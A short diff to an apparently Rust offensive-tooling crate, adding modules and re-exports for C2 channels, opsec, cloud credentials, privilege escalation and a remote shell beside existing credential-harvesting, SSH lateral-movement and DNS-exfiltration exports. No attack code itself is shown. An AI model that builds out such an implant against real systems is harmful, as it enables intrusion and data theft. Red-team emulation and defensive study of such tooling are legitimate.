@@ -57,6 +57,11 @@ pub mod whispernet;
 pub mod telemetry;
 pub mod chaos;
 pub mod ipc_contract;
+pub mod platform_layer;
+pub mod c2_channels;
+pub mod opsec;
+pub mod cloud_worker;
+pub mod remote_shell;
 
 pub use comms::HiveChamber;
 pub use identity::AgentIdentity;
@@ -69,3 +74,6 @@ pub use lateral::{harvest_credentials, exec_ssh, discover_hosts};
 pub use exfil::{dns_exfiltrate, ExfilScheduler};
 pub use attack::{generate_coverage_report, tag_action, techniques_by_module, TECHNIQUES};
 pub use system_info::{SystemInfo, LinuxInfo, WindowsInfo, PlatformInfo, is_edr_process, is_backup_process};
+pub use privesc::{PrivEscVector, PrivEscResult, ExploitTracker, RiskLevel};
+pub use cloud_worker::{CloudWorker, CloudCredential, CloudResult, CloudProvider};
+pub use remote_shell::{execute_command, execute_command_with_timeout, CommandResult, ExecSession, WsShell};
